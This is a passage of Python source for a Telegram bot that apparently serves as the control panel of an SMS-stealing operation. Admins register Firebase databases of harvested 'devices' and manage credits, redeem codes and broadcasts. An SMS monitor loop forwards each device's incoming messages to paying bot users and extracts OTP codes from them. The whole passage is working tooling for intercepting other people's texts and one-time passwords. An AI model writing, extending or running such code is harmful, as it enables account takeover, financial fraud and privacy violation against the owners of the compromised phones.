    if uid not in ADMIN_IDS or not action: return
    text = (update.message.text or "").strip()

    if action == "bulk_remove_fb":
        context.user_data.pop("admin_action", None)
        tags_to_remove = [t.strip().upper() for t in text.split(",") if t.strip()]
        if not tags_to_remove: await update.message.reply_text("❌ No tags found. Example: `FB35, FB36`", parse_mode="Markdown"); return
        removed_count = 0; kept_fbs = []
        for url, tag in global_fb_list:
            if tag.upper() in tags_to_remove: removed_count += 1
            else: kept_fbs.append((url, tag))
        global_fb_list[:] = kept_fbs; _retag_global_firebases(); _save_global_firebases()
        await update.message.reply_text(f"✅ *Bulk Removed!*\n\nRemoved `{removed_count}` firebases.", parse_mode="Markdown", reply_markup=admin_panel_kb()); return

    if action == "gift_single":
        parts = text.split()
        if len(parts) != 2: await update.message.reply_text("❌ Format: `<user_id> <hours>`", parse_mode="Markdown", reply_markup=admin_gift_kb()); return
        try: target_uid = int(parts[0].strip()); hours = float(parts[1].strip())
        except: await update.message.reply_text("❌ Invalid input.", reply_markup=admin_gift_kb()); return
        if hours <= 0 or hours > GIFT_ACCESS_MAX_HOURS: await update.message.reply_text(f"❌ Hours 1 se {GIFT_ACCESS_MAX_HOURS} ke beech.", reply_markup=admin_gift_kb()); return
        _ensure_user_record(target_uid); await _save_referral_db(); context.user_data.pop("admin_action", None)
        await update.message.reply_text(f"✅ Gifted {hours:g}h to `{target_uid}`", parse_mode="Markdown", reply_markup=admin_panel_kb()); return

    if action == "gift_all":
        try: hours = float(text.strip())
        except: await update.message.reply_text("❌ Invalid hours. Example: `5`", parse_mode="Markdown", reply_markup=admin_gift_kb()); return
        if hours <= 0 or hours > GIFT_ACCESS_MAX_HOURS: await update.message.reply_text(f"❌ Hours 1 se {GIFT_ACCESS_MAX_HOURS} ke beech.", reply_markup=admin_gift_kb()); return
        context.user_data.pop("admin_action", None)
        await update.message.reply_text(f"✅ Sent {hours:g}h access to {len(known_users)} users.", reply_markup=admin_panel_kb()); return

    if action == "add_firebase":
        url = normalize_fb_url(text)
        if not url: await update.message.reply_text("❌ *Invalid Firebase URL.*", parse_mode="Markdown", reply_markup=admin_back_kb()); context.user_data.pop("admin_action", None); return
        if any(u == url for u, _ in global_fb_list): await update.message.reply_text("⚠️ Already added.", reply_markup=admin_panel_kb()); context.user_data.pop("admin_action", None); return
        if len(global_fb_list) >= MAX_FIREBASES: await update.message.reply_text(f"❌ Max {MAX_FIREBASES} reached.", reply_markup=admin_panel_kb()); context.user_data.pop("admin_action", None); return
        msg = await update.message.reply_text(f"⏳ Validating:\n`{url}`", parse_mode="Markdown")
        ok = False; clients_count = 0; error_reason = "Unknown"
        try:
            session = aiohttp.ClientSession()
            try:
                clients, _ = await asyncio.wait_for(_try_fetch_clients(session, url), timeout=6.0)
                if clients: ok = True; clients_count = len(clients)
                else: error_reason = "No clients/devices found in Firebase"
            except asyncio.TimeoutError: error_reason = "Timeout — Firebase respond nahi kar rahi (6s)"
            except aiohttp.ClientConnectorError: error_reason = "DNS error — URL exist nahi karti"
            except Exception as e: error_reason = f"{type(e).__name__}: {str(e)[:50]}"
            finally: await session.close()
        except Exception as e: error_reason = f"Session error: {str(e)[:50]}"
        if not ok:
            await msg.edit_text(f"❌ *Firebase DEAD / Invalid*\n\n🔗 URL: `{url}`\n⚠️ Reason: `{error_reason}`\n\nYeh URL add nahi hui.", parse_mode="Markdown", reply_markup=admin_back_kb()); context.user_data.pop("admin_action", None); return
        new_tag = f"FB{len(global_fb_list) + 1}"; global_fb_list.append((url, new_tag)); _save_global_firebases(); context.user_data.pop("admin_action", None)
        asyncio.create_task(refresh_global_device_cache())
        await msg.edit_text(f"✅ *Firebase Added*\n\n🔥 Tag: `{new_tag}`\n🔗 `{url}`\n📱 Devices: `{clients_count}`\n\nCache refresh background mein chal raha hai.", parse_mode="Markdown", reply_markup=admin_panel_kb()); return

    if action == "bulk_add_firebase":
        lines = [line.strip() for line in text.split("\n") if line.strip()]
        if not lines: await update.message.reply_text("❌ No valid lines found."); return
        msg = await update.message.reply_text(f"⏳ Checking {len(lines)} URLs..."); context.user_data.pop("admin_action", None)
        added = 0; skipped_duplicate = 0; skipped_dead = 0; skipped_max = 0
        session = aiohttp.ClientSession()
        try:
            for line in lines:
                if len(global_fb_list) >= MAX_FIREBASES: skipped_max += 1; continue
                url = normalize_fb_url(line)
                if not url: skipped_dead += 1; continue
                if any(u == url for u, _ in global_fb_list): skipped_duplicate += 1; continue
                ok = False
                try:
                    clients, _ = await asyncio.wait_for(_try_fetch_clients(session, url), timeout=6.0)
                    if clients: ok = True
                except: pass
                if ok: new_tag = f"FB{len(global_fb_list) + 1}"; global_fb_list.append((url, new_tag)); added += 1
                else: skipped_dead += 1
            _save_global_firebases()
        finally: await session.close()
        if added > 0: asyncio.create_task(refresh_global_device_cache())
        report = (f"📦 *Bulk Add Report*\n\n✅ Successfully Added: `{added}`\n⚠️ Duplicates Skipped: `{skipped_duplicate}`\n❌ Dead/Invalid Skipped: `{skipped_dead}`\n🛑 Max Limit Skipped: `{skipped_max}`\n\n📊 Total Firebases: `{len(global_fb_list)}/{MAX_FIREBASES}`")
        await msg.edit_text(report, parse_mode="Markdown", reply_markup=admin_panel_kb()); return

    if action == "set_ref_credits":
        try: val = int(text.strip())
        except ValueError: await update.message.reply_text("❌ Send numbers only."); return
        if not (1 <= val <= 1000): await update.message.reply_text("❌ Value should be between 1 and 1000."); return
        REFERRAL_CREDITS = val; _save_bot_config(); context.user_data.pop("admin_action", None)
        await update.message.reply_text(f"✅ *Credits Updated*\n\nNow 1 refer = `{REFERRAL_CREDITS}` credits.", parse_mode="Markdown", reply_markup=admin_panel_kb()); return

    if action == "set_daily":
        try: val = int(text.strip())
        except ValueError: await update.message.reply_text("❌ Send numbers only."); return
        if val < 0 or val > 1000: await update.message.reply_text("❌ Value must be between 0 and 1000."); return
        DAILY_BONUS_CREDITS = val; _save_bot_config(); context.user_data.pop("admin_action", None)
        await update.message.reply_text(f"✅ *Daily Bonus Updated*\n\nNow users get `{DAILY_BONUS_CREDITS}` credits every 24 hours.", parse_mode="Markdown", reply_markup=admin_panel_kb()); return

    if action == "gen_redeem":
        parts = text.split()
        if len(parts) != 3: await update.message.reply_text("❌ Invalid Format!\nSahi format: `<code> <credits> <maxusers>`\nExample: `WELCOME10 10 50`", parse_mode="Markdown"); return
        code, credits_str, maxusers_str = parts
        try: credits_val = int(credits_str); maxusers_val = int(maxusers_str)
        except ValueError: await update.message.reply_text("❌ Credits aur Maxusers sirf numbers hone chahiye."); return
        code = code.upper(); REDEEM_CODES_DB[code] = {"credits": credits_val, "uses": maxusers_val, "used_count": 0}; _save_redeem_codes(); context.user_data.pop("admin_action", None)
        await update.message.reply_text(f"✅ *Code Generated Successfully!*\n\n🎟 Code: `{code}`\n💳 Credits: `{credits_val}`\n👥 Max Users: `{maxusers_val}`", parse_mode="Markdown", reply_markup=admin_panel_kb()); return

    if action == "check_user":
        try: target_uid = int(text.strip())
        except: await update.message.reply_text("❌ Invalid ID."); return
        rec = _ensure_user_record(target_uid); status = "🚫 Suspended" if rec.get("suspended") else "✅ Active"
        msg = (f"👤 *User Info*\n\n🆔 ID: `{target_uid}`\n💳 Credits: `{rec.get('credits', 0)}`\n🔗 Referrals: `{rec.get('referral_count', 0)}`\n📌 Status: {status}")
        context.user_data.pop("admin_action", None); await update.message.reply_text(msg, parse_mode="Markdown", reply_markup=admin_panel_kb()); return

    if action == "change_credit":
        parts = text.split()
        if len(parts) != 2: await update.message.reply_text("❌ Format: `<user_id> <credit>`", parse_mode="Markdown"); return
        try: target_uid, amt = int(parts[0]), int(parts[1])
        except: await update.message.reply_text("❌ Invalid numbers."); return
        rec = _ensure_user_record(target_uid); rec["credits"] = max(0, rec.get("credits", 0) + amt); _save_referral_db(); context.user_data.pop("admin_action", None)
        await update.message.reply_text(f"✅ User `{target_uid}` credits updated. New Balance: `{rec['credits']}`", parse_mode="Markdown", reply_markup=admin_panel_kb()); return

    if action == "credit_all":
        try: amt = int(text.strip())
        except: await update.message.reply_text("❌ Invalid number."); return
        for u in list(known_users):
            rec = _ensure_user_record(u); rec["credits"] = rec.get("credits", 0) + amt
        _save_referral_db(); context.user_data.pop("admin_action", None)
        await update.message.reply_text(f"✅ Successfully added `{amt}` credits to all users.", parse_mode="Markdown", reply_markup=admin_panel_kb()); return

    if action == "deduct_all":
        try: amt = int(text.strip())
        except: await update.message.reply_text("❌ Invalid number."); return
        for u in list(known_users):
            rec = _ensure_user_record(u); rec["credits"] = max(0, rec.get("credits", 0) - amt)
        _save_referral_db(); context.user_data.pop("admin_action", None)
        await update.message.reply_text(f"✅ Successfully deducted `{amt}` credits from all users.", parse_mode="Markdown", reply_markup=admin_panel_kb()); return

    if action in ["suspend", "unsuspend"]:
        try: target_uid = int(text.strip())
        except: await update.message.reply_text("❌ Invalid ID."); return
        rec = _ensure_user_record(target_uid)
        if action == "suspend": rec["suspended"] = True; msg = f"🚫 User `{target_uid}` has been suspended."
        else: rec["suspended"] = False; msg = f"✅ User `{target_uid}` has been unsuspended."
        _save_referral_db(); context.user_data.pop("admin_action", None); await update.message.reply_text(msg, parse_mode="Markdown", reply_markup=admin_panel_kb()); return

    if action == "add_channel":
        raw_text = text.strip()
        if "|" in raw_text:
            parts = [p.strip() for p in raw_text.split("|")]
            if len(parts) != 3: await update.message.reply_text("❌ *Invalid Format!*\n\n`Name | -100xxx | https://t.me/+xxx`", parse_mode="Markdown"); return
            label, chat_id, invite_link = parts
            if not chat_id.startswith("-100"): await update.message.reply_text("❌ Chat ID `-100` se start honi chahiye."); return
            if not invite_link.startswith("https://t.me/"): await update.message.reply_text("❌ Invite link `https://t.me/` se start hona chahiye."); return
            REQUIRED_CHANNELS.append({"id": chat_id, "label": label, "url": invite_link, "private": True})
            _save_required_channels(); context.user_data.pop("admin_action", None)
            await update.message.reply_text(f"✅ *Private Group Added!*\n\n📛 Name: {label}\n🆔 Chat ID: `{chat_id}`\n🔗 Link: {invite_link}\n\n⚠️ *Make sure bot is Admin in this group!*", parse_mode="Markdown", reply_markup=admin_panel_kb()); return
        username = raw_text
        if username.startswith("https://t.me/"): username = "@" + username.rstrip("/").rsplit("/", 1)[-1].split("?", 1)[0]
        if not re.fullmatch(r"@[A-Za-z0-9_]{5,32}", username): await update.message.reply_text("❌ *Invalid Format!*\n\nPublic: `@ch`\nPrivate: `Name | -100xxx | link`", parse_mode="Markdown"); return
        if any(str(c.get("id")).lower() == username.lower() for c in REQUIRED_CHANNELS): await update.message.reply_text("⚠️ Already added.", reply_markup=admin_panel_kb()); context.user_data.pop("admin_action", None); return
        try: chat = await context.bot.get_chat(username); title = chat.title or username
        except: await update.message.reply_text("❌ Channel not found or bot lacks access."); return
        REQUIRED_CHANNELS.append({"id": username, "label": title, "url": f"https://t.me/{username.lstrip('@')}", "private": False})
        _save_required_channels(); context.user_data.pop("admin_action", None); await update.message.reply_text(f"✅ *Public Channel Added:* {title}", parse_mode="Markdown", reply_markup=admin_panel_kb()); return

    if action == "broadcast":
        context.user_data.pop("admin_action", None); sent = failed = blocked = 0
        for target_uid in list(known_users):
            try:
                await context.bot.send_message(chat_id=target_uid, text=text); sent += 1
                rec = _ensure_user_record(target_uid)
                if rec.get("is_blocked", False): rec["is_blocked"] = False; _save_referral_db()
            except Exception as exc:
                failed += 1
                if "forbidden" in str(exc).lower() or "blocked" in str(exc).lower():
                    blocked += 1; rec = _ensure_user_record(target_uid); rec["is_blocked"] = True; _save_referral_db()
        await update.message.reply_text(f"📢 Broadcast complete.\n\n✅ Sent: {sent}\n❌ Failed: {failed}\n🚷 Blocked: {blocked}", reply_markup=admin_panel_kb()); return

async def text_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if context.user_data.get("admin_action"): await admin_text_input(update, context)
    elif "force_join_captcha" in context.user_data: await captcha_input(update, context)
    elif context.user_data.get("awaiting_redeem"):
        context.user_data.pop("awaiting_redeem", None); code = (update.message.text or "").strip().upper(); uid = update.effective_user.id
        if code in REDEEM_CODES_DB:
            data = REDEEM_CODES_DB[code]
            if data["used_count"] >= data["uses"]: await update.message.reply_text("❌ *This code has reached its usage limit.*", parse_mode="Markdown"); return
            data["used_count"] += 1; _save_redeem_codes()
            rec = _ensure_user_record(uid); rec["credits"] = rec.get("credits", 0) + data["credits"]; _save_referral_db()
            await update.message.reply_text(_bold_blockquote(f"🎉 𝗦𝗨𝗖𝗖𝗘𝗦𝗦\n\n💳 𝗔𝗱𝗱𝗲𝗱 : +{data['credits']} 𝗖𝗿𝗲𝗱𝗶𝘁𝘀\n📊 𝗡𝗲𝘄 𝗕𝗮𝗹𝗮𝗻𝗰𝗲 : {rec['credits']}"), parse_mode="HTML", reply_markup=connect_inline_kb())
        else: await update.message.reply_text("❌ *Invalid code.*", parse_mode="Markdown")

# ============================================================
# SMS MONITOR
# ============================================================
async def _delete_monitor_messages(bot, uid: int, chat_id: int, message_ids=None):
    state = sms_monitor_state.get(uid, {}); ids = list(message_ids if message_ids is not None else state.get("sent_message_ids", []))
    if not ids: return
    for message_id in ids:
        try: await bot.delete_message(chat_id=chat_id, message_id=message_id)
        except: pass
    if message_ids is None: state["sent_message_ids"] = []

async def _delete_monitor_status_message(bot, uid: int, chat_id: int):
    state = sms_monitor_state.get(uid, {}); message_id = state.get("monitor_message_id")
    if not message_id: return
    try: await bot.delete_message(chat_id=chat_id, message_id=message_id)
    except: pass
    state.pop("monitor_message_id", None)

def touch_sms_monitor(uid: int):
    state = sms_monitor_state.get(uid)
    if state: state["last_activity"] = time.monotonic()

def stop_sms_monitor(uid: int):
    task = sms_monitor_tasks.pop(uid, None); state = sms_monitor_state.get(uid)
    if state:
        bot = state.get("bot"); chat_id = state.get("chat_id")
        if bot and chat_id:
            message_ids = list(state.get("sent_message_ids", []))
            if message_ids: asyncio.create_task(_delete_monitor_messages(bot, uid, chat_id, message_ids))
            asyncio.create_task(_delete_monitor_status_message(bot, uid, chat_id))
    if task and not task.done(): task.cancel()
    sms_monitor_state.pop(uid, None)

def _msg_fingerprint(ts_key: str, m: dict) -> str:
    sender = _extract_msg_sender(m); body = _extract_msg_body(m); tval = ""
    if isinstance(m, dict):
        for k in ("time", "timestamp", "receivedTime", "sentTime", "dateTime", "createdAt"):
            v = m.get(k)
            if v is not None and str(v).strip(): tval = str(v).strip(); break
    return f"{ts_key}|{sender}|{body}|{tval}"

async def _sms_monitor_loop(bot, uid: int, chat_id: int, device_id: str, unlimited: bool = False, baseline_fingerprints=None, fb_url: str = "", task_token=None, state: dict = None):
    started = time.monotonic(); seen_fingerprints = set(baseline_fingerprints or ())
    session = aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=FB_REQUEST_TIMEOUT))
    real_cid = device_id; resolved_fb_url = fb_url; stop_reason = None
    try:
        tag, real_cid = _parse_prefixed(device_id)
        if not resolved_fb_url: resolved_fb_url = ((state or {}).get("fb_url") or sms_monitor_state.get(uid, {}).get("fb_url") or _find_fb_url_by_tag(uid, tag))
        if not resolved_fb_url: return
        url_with_query = build_fb_endpoint(resolved_fb_url, f"messages/{real_cid}", query='orderBy="$key"&limitToLast=50')
        url_plain = build_fb_endpoint(resolved_fb_url, f"messages/{real_cid}")
        while True:
            if not unlimited and (time.monotonic() - started >= SMS_MONITOR_DURATION): break
            current_state = sms_monitor_state.get(uid)
            if current_state is None or current_state is not state: break
            if unlimited and uid not in ADMIN_IDS:
                if (time.monotonic() - current_state.get("last_activity", started)) >= SMS_MONITOR_IDLE_TIMEOUT: stop_reason = "idle"; break
            if uid not in ADMIN_IDS:
                rec = _ensure_user_record(uid)
                if rec.get("suspended", False): stop_reason = "revoked"; break
            data, status, err = await fb_get_json(session, url_with_query, retries=0, timeout=6)
            if status != "SUCCESS" or not isinstance(data, (dict, list)) or not data: data, status, err = await fb_get_json(session, url_plain, retries=0, timeout=6)
            if status != "SUCCESS" or not isinstance(data, (dict, list)) or not data: await asyncio.sleep(SMS_MONITOR_INTERVAL); continue
            pairs = _newest_with_keys(data, limit=50); current_fps = [(k, m, _msg_fingerprint(k, m)) for k, m in pairs]
            new_msgs = [(k, m, fp) for k, m, fp in current_fps if fp not in seen_fingerprints]; new_msgs.sort(key=lambda x: str(x[0]))
            for ts_key, m, fp in new_msgs:
                sender = _extract_msg_sender(m); body = _extract_msg_body(m) or "(no body)"; when = _extract_msg_time(m, ts_key).replace(" | ", " • "); otp = _extract_otp(body)
                alert_lines = ["💬 ʟɪᴠᴇ ꜱᴍꜱ ʀᴇᴄᴇɪᴠᴇᴅ!", "〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️", "", f"📱 ꜰrom: {sender}", f"⏱️ ᴛime: {when}", "", f"{body}"]
                if otp: alert_lines.extend(["", f"🔑 ᴏᴛᴘ ᴅᴇᴛᴇᴄᴛᴇᴅ: <code>{otp}</code>"])
                try:
                    sent_message = await bot.send_message(chat_id=chat_id, text=_bold_blockquote("\n".join(alert_lines)), parse_mode="HTML")
                    seen_fingerprints.add(fp)
                    state = sms_monitor_state.get(uid)
                    if state is not None and state is current_state: state.setdefault("sent_message_ids", []).append(sent_message.message_id)
                except Exception as e: logger.error("[SMS MONITOR] notify error uid=%s err=%r", uid, e, exc_info=True)
            if len(seen_fingerprints) > 500: seen_fingerprints = set(fp for _, _, fp in current_fps)
            await asyncio.sleep(SMS_MONITOR_INTERVAL)
        if not unlimited:
            await _delete_monitor_messages(bot, uid, chat_id); await _delete_monitor_status_message(bot, uid, chat_id)
            try: await bot.send_message(chat_id=chat_id, text=("⏱️ *SMS Monitor Auto-Stopped*\n\n✅ Time poora ho gaya.\n▶️ Dobara GENERATE NUMBER dabao."), parse_mode="Markdown", reply_markup=connect_inline_kb())
            except: pass
        elif stop_reason == "idle":
            await _delete_monitor_messages(bot, uid, chat_id); await _delete_monitor_status_message(bot, uid, chat_id)
            try: await bot.send_message(chat_id=chat_id, text=_bold_blockquote("⏱️ 𝗠𝗢𝗡𝗜𝗧𝗢𝗥 𝗔𝗨𝗧𝗢-𝗦𝗧𝗢𝗣𝗣𝗘𝗗\n\n⚠️ 𝟭𝟬 𝗺𝗶𝗻𝘂𝘁𝗲𝘀 𝘀𝗲 𝗸𝗼𝗶 𝗯𝘂𝘁𝘁𝗼𝗻 𝗻𝗮𝗵𝗶 𝗱𝗮𝗯𝗮𝘆𝗮\n\n🔄 𝗔𝗰𝗰𝗲𝘀𝘀 𝗮𝗴𝗮𝗶𝗻 𝗸𝗲 𝗹𝗶𝘆𝗲 /start 𝗱𝗮𝗯𝗮𝗼 𝗮𝘂𝗿 𝗻𝗮𝘆𝗮 𝗺𝗼𝗻𝗶𝘁𝗼𝗿 𝘀𝘁𝗮𝗿𝘁 𝗸𝗮𝗿𝗼."), parse_mode="HTML", reply_markup=connect_inline_kb())
            except: pass
        elif stop_reason == "revoked":
            await _delete_monitor_messages(bot, uid, chat_id); await _delete_monitor_status_message(bot, uid, chat_id)
            try: await bot.send_message(chat_id=chat_id, text=_bold_blockquote("⛔ 𝗠𝗢𝗡𝗜𝗧𝗢𝗥 𝗦𝗧𝗢𝗣𝗣𝗘𝗗\n\n⚠️ 𝗬𝗼𝘂𝗿 𝗮𝗰𝗰𝗼𝘂𝗻𝘁 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝘀𝘂𝘀𝗽𝗲𝗻𝗱𝗲𝗱.\n\n📌 𝗦𝗲𝗻𝗱 /start 𝘁𝗼 𝗿𝗲𝘀𝘁𝗮𝗿𝘁."), parse_mode="HTML", reply_markup=connect_inline_kb())
            except: pass
    except asyncio.CancelledError: raise
    except Exception as e: logger.error("[SMS MONITOR] crashed uid=%s err=%r", uid, e, exc_info=True)
    finally:
        try: await session.close()
        except: pass
        current_state = sms_monitor_state.get(uid)
        if current_state is state: sms_monitor_state.pop(uid, None); sms_monitor_tasks.pop(uid, None)

def start_sms_monitor(bot, uid: int, chat_id: int, device_id: str, unlimited: bool = False, baseline_fingerprints=None, fb_url: str = ""):
    stop_sms_monitor(uid); task_token = object(); now = time.monotonic()
    state = {"device_id": device_id, "chat_id": chat_id, "sent_message_ids": [], "bot": bot, "unlimited": unlimited, "baseline_fingerprints": set(baseline_fingerprints or ()), "fb_url": fb_url, "task_token": task_token, "last_activity": now}
    sms_monitor_state[uid] = state
    task = asyncio.create_task(_sms_monitor_loop(bot, uid, chat_id, device_id, unlimited=unlimited, baseline_fingerprints=baseline_fingerprints, fb_url=fb_url, task_token=task_token, state=state))
    sms_monitor_tasks[uid] = task

def _parse_prefixed(device_id: str):
    if "|" in device_id: parts = device_id.split("|", 1); return parts[0], parts[1]
    return "", device_id

def _find_fb_url_by_tag(uid: int, tag: str) -> Optional[str]:
    for url, t in global_fb_list:
        if t == tag: return url
    sess = user_sessions.get(uid)
    if sess:
        for url, t in sess.get("fb_list", []):
            if t == tag: return url
    return None

# ============================================================
# ADMIN CALLBACKS
# ============================================================
def _admin_only(uid: int) -> bool: return uid in ADMIN_IDS

async def _admin_show_firebases(q):
    text = _build_admin_fb_text(); await q.edit_message_text(text, parse_mode="Markdown", reply_markup=admin_firebases_kb(0))
    await _start_admin_panel_live_task(q.bot, q.from_user.id, q.message.chat_id, q.message.message_id)

async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global global_fb_list, maintenance_mode, captcha_enabled, _last_refresh_time, REFERRAL_CREDITS, DAILY_BONUS_CREDITS
    q = update.callback_query; uid = q.from_user.id
    if not _admin_only(uid): await q.answer("Admin only.", show_alert=True); return
    await q.answer(); data = q.data
    if not (data == "admin_manage_fb" or data.startswith("admin_fb_refresh:") or data.startswith("admin_fb_info:") or data.startswith("admin_fb_delete:") or data.startswith("admin_fb_page:") or data == "admin_remove_dead_fb" or data == "admin_bulk_remove_fb" or data == "noop_fb"): _stop_admin_panel_live_task(uid)

    if data == "admin_fb_page:" + data.split(":")[-1] if ":" in data else False:
        page = int(data.split(":", 1)[1]); text = _build_admin_fb_text()
        await q.edit_message_text(text, parse_mode="Markdown", reply_markup=admin_firebases_kb(page)); return
    if data == "noop_fb": await q.answer("Stay on this page"); return
    
    if data == "admin_remove_dead_fb":
        await q.answer("⏳ Checking & Removing 0 Online...")
        removed_count = 0; kept_fbs = []; per_fb = global_device_cache.get("per_fb", {})
        for url, tag in global_fb_list:
            counts = per_fb.get(tag) or {}; online = int(counts.get("online", 0))
            if online == 0: removed_count += 1
            else: kept_fbs.append((url, tag))
        global_fb_list[:] = kept_fbs; _retag_global_firebases(); _save_global_firebases()
        text = _build_admin_fb_text(); await q.edit_message_text(f"✅ *Cleanup Done!*\nRemoved `{removed_count}` dead firebases.\n\n" + text, parse_mode="Markdown", reply_markup=admin_firebases_kb(0)); return

    if data == "admin_bulk_remove_fb":
        context.user_data["admin_action"] = "bulk_remove_fb"
        await q.edit_message_text("🗑 *Bulk Remove Firebases*\n\nSend tags separated by comma.\nExample: `FB35, FB36, FB48`", parse_mode="Markdown", reply_markup=admin_back_kb()); return

    if data == "admin_check_user": context.user_data["admin_action"] = "check_user"; await q.edit_message_text("🔍 *Check User*\n\nSend the User ID:", parse_mode="Markdown", reply_markup=admin_back_kb()); return
    if data == "admin_change_credit": context.user_data["admin_action"] = "change_credit"; await q.edit_message_text("✏️ *Change Credit*\n\nFormat: `<user_id> <credit>`\nExample: `123456789 50` (Add)\nExample: `123456789 -20` (Deduct)\n\nSend message below:", parse_mode="Markdown", reply_markup=admin_back_kb()); return
    if data == "admin_credit_all": context.user_data["admin_action"] = "credit_all"; await q.edit_message_text("📢 *Credit to All*\n\nHow many credits to add to everyone? (Send number)\nExample: `5`", parse_mode="Markdown", reply_markup=admin_back_kb()); return
    if data == "admin_deduct_all": context.user_data["admin_action"] = "deduct_all"; await q.edit_message_text("🔴 *Deduct from All*\n\nHow many credits to deduct from everyone? (Send number)\nExample: `5`", parse_mode="Markdown", reply_markup=admin_back_kb()); return
    if data == "admin_suspend": context.user_data["admin_action"] = "suspend"; await q.edit_message_text("🚫 *Suspend User*\n\nSend the User ID to suspend:", parse_mode="Markdown", reply_markup=admin_back_kb()); return
    if data == "admin_unsuspend": context.user_data["admin_action"] = "unsuspend"; await q.edit_message_text("✅ *Unsuspend User*\n\nSend the User ID to unsuspend:", parse_mode="Markdown", reply_markup=admin_back_kb()); return
    if data == "admin_set_ref_credits": context.user_data["admin_action"] = "set_ref_credits"; await q.edit_message_text(f"⚙️ *Set Referral Credits*\n\nCurrent credit: `{REFERRAL_CREDITS}`\n\nSend a new number (between 1 and 1000):\nExample: `15`", parse_mode="Markdown", reply_markup=admin_back_kb()); return
    if data == "admin_set_daily": context.user_data["admin_action"] = "set_daily"; await q.edit_message_text(f"🎁 *Set Daily Bonus*\n\nCurrent Bonus: `{DAILY_BONUS_CREDITS}` credits\n\nSend a new number (0 to disable):\nExample: `3`", parse_mode="Markdown", reply_markup=admin_back_kb()); return
    if data == "admin_gen_redeem": context.user_data["admin_action"] = "gen_redeem"; await q.edit_message_text("🎟 *Generate Redeem Code*\n\nFormat: `<code> <credits> <maxusers>`\n\nExample: `DIWALI50 50 100`", parse_mode="Markdown", reply_markup=admin_back_kb()); return

    if data == "admin_backup_now":
        await q.answer("⏳ Creating backup...")
        try:
            json_files = ["force_join_channels.json", "bot_users.json", "maintenance_mode.json", "global_firebases.json", "global_devices_cache.json", "captcha_state.json", "referrals.json", "bot_config.json", "redeem_codes.json"]
            zip_buffer = io.BytesIO()
            with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zipf:
                for file in json_files:
                    if os.path.exists(file): zipf.write(file)
            zip_buffer.seek(0); dt_str = datetime.now().strftime('%d-%m_%H-%M')
            await context.bot.send_document(chat_id=uid, document=zip_buffer, filename=f"manual_backup_{dt_str}.zip", caption=f"📦 **Manual Backup**\n\n⏰ Time: {datetime.now().strftime('%d-%m-%Y %I:%M %p')}\n💾 Data safe!")
            await q.message.reply_text("✅ Backup successfully sent!")
        except Exception as e: logger.error(f"Manual backup failed: {e}"); await q.message.reply_text("❌ Backup failed.")
        return

    if data == "admin_bulk_add_fb": context.user_data["admin_action"] = "bulk_add_firebase"; await q.edit_message_text("📦 *Bulk Add Firebases*\n\nPaste Firebase URLs (one per line).", parse_mode="Markdown", reply_markup=admin_back_kb()); return
    if data == "admin_gift_access": await q.edit_message_text("🎁 *Gift Access*\n\n👤 *Single User* — Give access to one user\n👥 *All Users* — Give access to everyone", parse_mode="Markdown", reply_markup=admin_gift_kb()); return
    if data == "admin_gift_single": context.user_data["admin_action"] = "gift_single"; await q.edit_message_text("👤 *Gift Single User*\n\nFormat: `<user_id> <hours>`", parse_mode="Markdown", reply_markup=admin_gift_kb()); return
    if data == "admin_gift_all": context.user_data["admin_action"] = "gift_all"; await q.edit_message_text(f"👥 *Gift All Users*\n\nSend only hours.\nTotal users: `{len(known_users)}`", parse_mode="Markdown", reply_markup=admin_gift_kb()); return

    if data == "admin_toggle_maintenance":
        maintenance_mode = not maintenance_mode; _save_maintenance_mode()
        notice = (_bold_blockquote("🛠️ 𝗠𝗔𝗜𝗡𝗧𝗘𝗡𝗔𝗡𝗖𝗘 𝗠𝗢𝗗𝗘 𝗢𝗡 ⚙️") if maintenance_mode else _bold_blockquote("✅ 𝗕𝗢𝗧 𝗠𝗔𝗜𝗡𝗧𝗘𝗡𝗔𝗡𝗖𝗘 𝗠𝗢𝗗𝗘 𝗢𝗙𝗙"))
        sent = failed = 0
        for target_uid in list(known_users):
            try: await context.bot.send_message(chat_id=target_uid, text=notice, parse_mode="HTML"); sent += 1
            except: failed += 1
        await q.edit_message_text(f"{notice}\n\n📨 Sent: {sent}\n❌ Failed: {failed}", parse_mode="HTML", reply_markup=admin_panel_kb()); return

    if data == "admin_toggle_captcha": captcha_enabled = not captcha_enabled; _save_captcha_enabled(); await q.edit_message_text(f"🔐 Captcha: {'ON' if captcha_enabled else 'OFF'}", reply_markup=admin_panel_kb()); return
    if data == "admin_back": context.user_data.pop("admin_action", None); await q.edit_message_text("🛠 *Admin Panel*\n\nSelect an action:", parse_mode="Markdown", reply_markup=admin_panel_kb()); return
    if data == "admin_stats": await q.edit_message_text(f"📊 *Bot Statistics*\n\n👥 Total users: `{len(known_users)}`\n🔗 Firebases: `{len(global_fb_list)}`\n🔗 Force-join channels: `{len(REQUIRED_CHANNELS)}`\n💾 Active sessions: `{len(user_sessions)}`\n📨 Active SMS monitors: `{len(sms_monitor_tasks)}`\n🔐 Captcha: `{'ON' if captcha_enabled else 'OFF'}`", parse_mode="Markdown", reply_markup=admin_back_kb()); return
    if data == "admin_add_firebase":
        if len(global_fb_list) >= MAX_FIREBASES: await q.answer(f"Max {MAX_FIREBASES} Firebase allowed.", show_alert=True); return
        context.user_data["admin_action"] = "add_firebase"; await q.edit_message_text("➕ *Add Firebase*\n\nSend Firebase Realtime Database URL.", parse_mode="Markdown", reply_markup=admin_back_kb()); return
    if data == "admin_manage_fb": await _admin_show_firebases(q); return

    if data.startswith("admin_fb_refresh:"):
        try:
            idx = int(data.split(":", 1)[1])
            if idx < 0 or idx >= len(global_fb_list): await q.answer("Invalid Firebase.", show_alert=True); return
            url, tag = global_fb_list[idx]; await q.edit_message_text(f"⏳ Refreshing `{tag}`...")
            await refresh_global_device_cache(); _last_refresh_time = time.monotonic()
            text = _build_admin_fb_text(); await q.edit_message_text(text, parse_mode="Markdown", reply_markup=admin_firebases_kb(0))
            await _start_admin_panel_live_task(context.bot, uid, q.message.chat_id, q.message.message_id)
        except Exception as e: logger.error("admin_fb_refresh: %s", e); await q.edit_message_text("❌ Refresh failed.", reply_markup=admin_firebases_kb(0))
        return

    if data.startswith("admin_fb_delete:"):
        try:
            idx = int(data.split(":", 1)[1])
